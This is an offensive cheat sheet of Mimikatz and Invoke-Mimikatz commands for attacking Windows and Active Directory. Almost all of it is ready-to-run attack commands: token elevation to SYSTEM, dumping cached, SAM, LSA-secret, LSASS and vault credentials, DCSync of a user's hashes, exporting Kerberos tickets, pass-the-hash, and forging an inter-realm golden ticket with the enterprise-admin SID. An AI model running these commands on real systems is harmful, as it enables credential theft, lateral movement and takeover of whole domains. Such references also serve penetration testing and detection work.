### Source 
https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1  
https://github.com/gentilkiwi/mimikatz  

### Elevate to system ("token::revert" to drop token)
```
Invoke-Mimikatz -Command '"token::elevate"'
```

### Dump credentials
```
Domain Cached Credential - "lsadump::cache"
Security Hives - "lsadump::sam"
Machine Accounts "lsadump::secrets"
Local Security Authority Substem Service - "sekurlsa::logonPasswords full"
Data Protection API - "vault::cred"
```

### Execute DCSync for single user
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /user:<user>"'
```

### Export all tickets from memory
```
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmHash>"'
```

### Inter realm golden ticket - can be done offline, since domain controller connection is not necessary (/enind = validity period 60 minutes, /user can be fictitious, -519 is the SID of enteprise admin)
```
Invoke-Mimikatz -Command '"kerberos::golden /user:<attackerAccount> /domain:<compromisedDomain> /sid:<sidCompromisedDomain> /sids:<sidTargetDomain>-519 /krbtgt:<ntlmHashKrbTgt> /endin:60"'
```

### Dump credentials from lsass dump
```
mimikatz.exe
mimi> sekurlsa::minidump <file>.dmp
mimi> sekurlsa::logonPasswords full
```

### Write output of command to file
```
mimi> log <file>.txt
```

